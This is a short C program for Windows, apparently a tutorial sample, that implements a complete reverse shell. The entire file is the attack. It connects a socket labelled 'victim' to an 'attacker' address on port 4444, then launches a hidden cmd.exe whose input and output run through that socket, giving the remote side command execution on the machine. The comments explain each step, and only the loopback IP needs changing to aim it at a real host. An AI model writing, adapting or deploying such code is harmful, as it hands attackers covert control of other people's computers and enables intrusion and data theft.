// We want a library to connect to the attacker
#include <winsock2.h>

// a library to interact with windows
#include <windows.h>

// a library to convert ip addresses
#include <ws2tcpip.h>

// a library for our input/output
#include <stdio.h>

// And lastly, something to link our connections to processes
#pragma comment(lib, "ws2_32.lib")

int main(void) {

    // In C we have to manually setup our structures
    // This is our connection structure
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Initialize victim
    SOCKET victim = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Setup structure for attacker connection
    struct sockaddr_in attacker;
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons(4444);
    inet_pton(AF_INET, "127.0.0.1", &attacker.sin_addr);

    // Connect to attacker
    connect(victim, (struct sockaddr*)&attacker, sizeof(attacker));

    // Setup structure to our new process
    STARTUPINFO startup_info = { 0 };
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags = STARTF_USESTDHANDLES;
    startup_info.hStdInput = startup_info.hStdOutput = startup_info.hStdError = (HANDLE)victim;
    PROCESS_INFORMATION process_info;

    // Create the process
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info);

    // Continue executing until disconnect
    WaitForSingleObject(process_info.hProcess, INFINITE);

    // Usually in higher level languages, this occurs for us
    // But in C, its important you release memory correctly
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);
    closesocket(victim);
    WSACleanup();

    return 0;
}